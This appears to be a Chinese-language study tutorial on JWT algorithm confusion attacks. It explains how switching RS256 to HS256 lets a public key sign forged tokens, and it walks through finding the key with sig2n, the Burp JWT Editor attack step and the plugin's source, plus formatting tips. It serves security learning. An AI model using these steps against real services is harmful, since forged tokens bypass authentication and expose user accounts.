## 什么是算法混淆？

在许多早期或设计不当的 JWT 库中，验证签名的 API 往往只设计了一个，比如：

```js hlt:secretOrPublicKey hl:2
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

如果开发者不知道该 API 内部还会进行算法选择，则可能写出这样的代码：

```js
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

攻击者只需修改 `alg` 参数的值，就会使得对称签名算法与非对称签名算法在验签过程中都使用同一把密钥（这就是**算法混淆**），而：

- 非对称签名算法的验签密钥（公钥）往往是公开的
- 对称签名算法中的签名与验签都使用同一把密钥

导致攻击者可以用**公钥**签发采用**对称签名算法**的 JWT。

>[!tip]
> 注意加粗词哦！

## 如何利用？

核心：

1. 将验签算法，从非对称签名算法切换成对称签名算法
2. 找到公钥，用公钥签发 JWT

### 步骤一：找公钥

服务器有时会将 JWK Set 存放于一些标准端点中，比如：

- `/jwks.json`
- `/.well-known/jwks.json`

即使密钥未公开，你也能够从**一对**现有的 JWT 中提取出公钥：

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

>[!tip]
>你需要下载 Docker，首次运行此命令时，它会自动从 Docker Hub 拉取镜像（可能需要几分钟）。

此工具会使用你提供的一对 JWT，计算一个或多个可能的 n 值，最终输出一个：

- 采用 X.509 格式的经过 Base64 编码的 PEM 密钥
- 采用 PKCS1 格式的经过 Base64 编码的 PEM 密钥

### 步骤二：公钥格式确认

公钥有多种存储格式：

- JWK
- PEM

你选择使用的格式需要和验证端统一。而且，即使格式一致了，其内部内容包括不可打印字符（比如换行符）也需要统一。

>[!info]
> HMAC 对密钥的每一个字节都敏感。

假设你获得了 JWK Set：

### 步骤三：改算法 + 签名

接下来就是去 Header 中，修改 `alg` 算法为对称签名算法，并对进行重新签名操作得到 Signature。

这一过程通过 JWT Editor 插件能很方便地实现。

点击“Attack”，选择“HMAC Key Confusion”：

![[Pasted image 20261018032438.png]]

在新出现的窗口中，选择刚刚创建的公钥：

![[Pasted image 20261018032021.png|500]]

你可以尝试多个对称签名算法（毕竟你不知道服务器端会使用哪个），并且 Options 选项支持你调整公钥内部内容：

- 换行符风格
- `-----END PUBLIC KEY-----` 后是否还需要换行符（trailing newline）

使得公钥在内容以及格式上与验证方对齐。

![[Pasted image 20261018032718.png|500]]

选择完毕后，点“OK”。

>[!important]
> 此时你无需再手动 Sign，Signature 已经帮你算好了。

### 坑点

不难发现，使用“Attack → HMAC Key Confusion”实现算法混淆攻击，过程中**并不会让你选择密钥的格式**。

根据插件对应部分的[源码](https://github.com/PortSwigger/jwt-editor/blob/main/src/main/java/com/blackberry/jwteditor/operations/HmacKeyConfusionAttack.java)：

```java hlt:jwkToPemKey
public class HmacKeyConfusionAttack {

    public static JWS attack(JWS jws, JWKKey key, JWSAlgorithm algorithm, NewLineStrategy newLineStrategy) throws PemException, UnsupportedKeyException, SigningException {
        String publicKeyAsPem = PemKeyFactory.jwkToPemKey(key.getJWK().toPublicJWK()).toString(newLineStrategy);
        byte[] pemBytes = publicKeyAsPem.getBytes();

        // Build a new header for the chosen HMAC algorithm
        JWSHeader signingInfo = new JWSHeader.Builder(algorithm).type(JWT).build();

        // Construct a HMAC signing key from the PEM bytes
        JWKKey signingKey = JWKKeyFactory.from(new OctetSequenceKey.Builder((pemBytes)).build());

        // Sign and return the new JWS
        Base64URL header = signingInfo.toBase64URL();
        Base64URL payload = jws.claims().encoded();

        return JWSFactory.sign(signingKey, header, payload, signingInfo);
    }
}
```

有一个密钥格式转换的过程，即最终的签名操作，**用的都是 PEM 格式的公钥**。

如果服务器采用的是 JWK 格式的公钥，则可能导致攻击失败。

因此，你还需要掌握手动实现算法混淆攻击。

由于 HMAC Key Confusion 支持 PEM，因此只需要掌握 JWK 的相关步骤。

假设你已经获得了 JWK 格式的公钥：

```json
{
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "cd3de04d-dd4d-4821-8857-3f7eed9e3c7c",
  "alg": "RS256",
  "n": "m0b2tK1CSZt525d37YCMFwIHZ4CidKj8tD4Y3VlR6lLL7Tb3dWcLKTWtiA1-hdsj9qOnQ6-_cxhg-YEjA34U2I81__sxr4DMDIL2x1SeQKIm3YBucn-NGqZsc5XYLvNGjOzRcL14gM_M2u_vViqa84JOmyes1tpFq95uOXgJRXBieS0XlssbmaLKf03gSPGPp2RdLLnXm0yiOjV6uqkOvOiKUv0Yj4xtnk0K5xBGHcEi3j2Ffw_vRyx0PjbNsinkzNIzMBrxtjP3tqB3575lDAXbh6ndLvD7c6_cMbXwsPbw2KyNpAxKjwohzP7MoXz7VLfC8bNY26v53BTl9c0NFw"

```

此时，你需要考虑：

- 换行符（`%0a%0d` 还是 `%0d` 还是没有换行符）
- 键值对之间，逗号分隔之后还有没有空格？（`{"kty": "RSA","e": "AQAB",……}` 还是 `{"kty": "RSA", "e": "AQAB",……}`）
- 键值对中，冒号之后是否还有空格？（`"kty": "RSA"` 还是 `"kty":"RSA"`）

> 可能需要多次尝试。
